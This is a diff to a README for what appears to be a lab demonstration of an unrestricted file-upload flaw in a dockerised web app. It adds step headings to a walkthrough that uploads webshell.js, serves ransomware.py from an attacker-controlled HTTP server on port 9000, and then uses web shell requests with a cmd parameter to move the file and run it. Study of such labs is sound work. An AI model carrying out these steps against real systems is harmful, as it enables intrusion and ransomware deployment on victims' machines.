@@ -13,8 +13,10 @@ docker compose up -d --build
 ```
 The web page is accessed through a browser (```http://<IP_VM>:8080```).
 
+### Step 1: Upload ```webshell.js``` file
 Next, the file ```webshell.js```is uploaded; once uploaded, a communication channel with the victim machine is established. This is possible because, in the vulnerable versions, the server doesn't check the file format and saves it of victime machine.
 
+### Step 2: Download ```ransomware.py``` file from the attacker web server
 An attacker-controlled web server is then started, from which the file ```ransomware.py``` can be downloaded:
 ```bash
 python3 -m http.server 9000
@@ -28,6 +30,7 @@ The file is then moved into the appropriate directory:
 ```bash
 http://<IP_VM>:8080/webshell.js/?cmd=mv ransomware.py ./public/
 ```
+### Step 4: Launch the attack
 Finally, the attack is launched:
 ```bash
 http://<IP_VM>:8080/webshell.js/?cmd=python3 ./public/ransomware.py
